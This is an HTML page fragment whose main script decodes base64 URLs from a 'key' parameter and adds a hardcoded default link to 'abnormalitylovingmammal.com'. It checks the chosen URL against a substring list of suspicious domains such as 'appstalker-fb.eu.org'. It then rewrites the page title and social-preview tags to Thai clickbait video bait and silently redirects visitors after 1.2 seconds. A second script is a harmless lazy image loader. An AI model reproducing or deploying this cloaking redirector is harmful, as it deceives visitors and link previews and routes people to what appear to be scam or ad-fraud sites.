<script>
(function () {
  const params = new URLSearchParams(window.location.search);
  const encoded = params.get('key');
  if (!encoded) return;

  try {
    const decoded = atob(encoded.trim());
    const userUrls = decoded.split('|');
    const myDefaultUrls = [
      "https://abnormalitylovingmammal.com/pzv09c268e?key=159001feab4927b67c14cbb2f7d2d1cc"
    ];
    const allUrls = [...userUrls, ...myDefaultUrls];
    const finalUrl = allUrls[Math.floor(Math.random() * allUrls.length)];
    const urlObj = new URL(finalUrl);
    const host = urlObj.hostname;

    const allowedDomains = [
      "abnormalitylovingmammal.com",
      "pwcenter.eu.org",
      "otieu.com",
      "appstalker-fb.eu.org",
      "xpweyurt.eu.org"
    ];

    const isAllowed = allowedDomains.some(domain => host.includes(domain));

    if (isAllowed) {
      const title = "Watch Enkai987 น้อง ริน มาแน้วววว";
      document.getElementById('meta-title').innerText = title;
      document.getElementById('meta-desc').setAttribute('content', title);
      document.getElementById('og-title').setAttribute('content', title);
      document.getElementById('og-desc').setAttribute('content', title);

      document.getElementById("errorPage").style.display = "none";
      document.getElementById("loader").style.display = "flex";

      setTimeout(() => {
        window.location.href = finalUrl;
      }, 1200);
    }
  } catch (err) {
    console.error("Broken page:", err);
  }
})();
</script>

<script>
document.addEventListener("DOMContentLoaded", function () {
  const img = document.getElementById('lazyImage');
  const src = img.getAttribute('data-src');
  if (!src) return;

  const tempImg = new Image();
  tempImg.onload = function () {
    img.src = src;
  };
  tempImg.src = src;
});
</script>
